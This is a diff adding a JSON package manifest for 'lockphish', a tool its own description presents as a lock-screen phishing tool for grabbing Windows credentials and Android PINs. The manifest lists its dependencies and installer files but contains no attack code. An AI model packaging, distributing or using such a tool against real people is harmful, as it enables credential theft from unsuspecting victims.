@@ -1,0 +1,14 @@
+{
+  "name": "lockphish",
+  "version": "1.0",
+  "arch": "all",
+  "homepage": "https://github.com/JasonJerry/lockphish",
+  "maintainer": "Ivam3 <https://t.me/Ivam3_Bot>",
+  "depends": ["git, php, openssh"],
+  "suggests": ["i-haklab, ngrok"],
+  "description": "Tool for phishing attacks on the lock screen, designed to grab Windows credentials, Android PIN.",
+  "files" :{
+    "lockphish-installer": "bin/lockphish-installer",
+    "lockphish": "bin/lockphish"
+  }
+}
